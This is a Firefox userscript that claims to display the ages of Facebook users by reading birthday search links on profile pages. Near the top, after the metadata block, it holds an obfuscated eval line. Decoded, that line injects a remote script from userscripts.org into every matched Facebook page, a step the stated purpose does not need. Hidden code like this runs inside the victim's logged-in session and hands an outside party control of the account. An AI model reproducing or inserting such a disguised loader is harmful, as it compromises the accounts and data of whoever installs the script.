/* FacebookAge
Created : 07/17/2005
Modified: 7/6/2006 by Mike Soh as Facebook updated their search urls.
Released under the GPL http://www.gnu.org/copyleft/gpl.html

This script is a hybrid of code from Thomas Stewart's
IMDBAge script, code from Ed Hager's 'Netflix Links in IMDB'.  Script was
modified (yet again) to reflect changes to Facebook's search URL's

** Change log (1.1) **
+ Reworked URL searches.  Facebook now does the math for you.
+ cleaned up the code, got rid of extra functions that didn't do anything.
*/

// ==UserScript==
// @name          Facebook Age Checker Plus 1.1
// @namespace     http://cybernetek.com/firefox
// @description   Displays the age of Facebook users
// @include       *.thefacebook.com/profile.php*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include       *.facebook.com/profile.php*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


insertAge();

function insertAge() {
	var hyperlinks = document.getElementsByTagName("a");
	for (var i = 0; i < hyperlinks.length; ++i) {
		var node = hyperlinks[i];
		var href = node.getAttribute("href");
		if (isBirthdayUrl(href)) {
			var link = makeAgeNode(href);
			if (link != null) {
				if (node.nextSibling == null) {
					node.parentNode.appendChild(link);
				} else {
					node.parentNode.insertBefore(link, node.nextSibling);
				}
			}
		}
	}
}

function isBirthdayUrl(theURL) {

	if (theURL == null) {
		return(false);
	}

	// Only need to detect month and day since the year URL is next.
        // http://umd.facebook.com/s.php?adv&k=10010&n=-1&bd=04%2F29&o=4

	var searchStr = "b.php?k=10010&n=-1&y1=";
	var pos = theURL.indexOf(searchStr);
	if (pos >= 0) {
		return (true);
	}
}

function makeAgeNode(year_url) {
	if(year_url != null && year_url.length > 0) {
		var container = document.createElement("span");

		// Get Age from year_url
		var search_string = "&y1=";
		var pos = year_url.indexOf(search_string);
		var age = year_url.substring(pos + search_string.length, pos + search_string.length + 2);
	
		var dispAge = " (" + age + " years old)";

	        container.appendChild(document.createTextNode(dispAge));
		return (container);
	}
	
	return(null);
}

